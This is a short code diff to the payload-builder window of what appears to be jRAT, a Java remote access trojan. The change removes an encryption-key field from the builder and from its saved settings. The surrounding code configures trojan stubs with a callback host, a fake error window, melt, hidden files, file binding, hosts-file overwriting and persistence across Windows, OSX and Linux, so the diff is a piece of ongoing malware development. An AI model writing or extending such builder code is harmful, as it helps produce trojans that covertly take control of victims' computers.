@@ -14,10 +14,9 @@ import io.jrat.client.net.PortListener;
 import io.jrat.client.settings.Settings;
 import io.jrat.client.ui.components.PortListenerJComboBox;
 import io.jrat.client.utils.NetUtils;
-import io.jrat.client.utils.Utils;
 import io.jrat.common.OperatingSystem;
 import io.jrat.common.crypto.Crypto;
-import io.jrat.common.crypto.EncryptionKey;
+import io.jrat.common.utils.Utils;
 
 import java.awt.Color;
 import java.awt.Toolkit;
@@ -143,7 +142,6 @@ public class FrameBuildMinimal extends BaseFrame {
 		JComboBox<?> comboBox = new PortListenerJComboBox(new SocketComboBoxListener() {
 			@Override
 			public void onChange(PortListener pl) {
-				txtKey.setText(pl.getKey().getTextualKey());
 				txtPass.setText(pl.getPass());
 				spPort.setValue(pl.getServer().getLocalPort());
 			}
@@ -219,7 +217,6 @@ public class FrameBuildMinimal extends BaseFrame {
 				String[] address = new String[] { txtHost.getText().trim() + ":" + spPort.getValue().toString() };
 				String id = txtId.getText().trim();
 				String pass = txtPass.getText().trim();
-				EncryptionKey key = new EncryptionKey(txtKey.getText().trim());
 				boolean crypt = chckbxEmbed.isSelected();
 				String droppath = cbLocation.getSelectedItem().toString();
 				int reconSec = 10;
@@ -258,12 +255,11 @@ public class FrameBuildMinimal extends BaseFrame {
 				osconfig.addOS(OperatingSystem.OSX);
 				osconfig.addOS(OperatingSystem.LINUX);
 
-				Build.build(l, Files.getStub(), file, address, id, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, null);
+				Build.build(l, Files.getStub(), file, address, id, pass, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, null);
 
 				Settings.getGlobal().setVal("baddresses", address);
 				Settings.getGlobal().setVal("bid", id);
 				Settings.getGlobal().setVal("bpass", pass);
-				Settings.getGlobal().setVal("bkey", key.getTextualKey());
 				Settings.getGlobal().setVal("bcrypt", crypt);
 				Settings.getGlobal().setVal("brecat", reconSec);
 			}
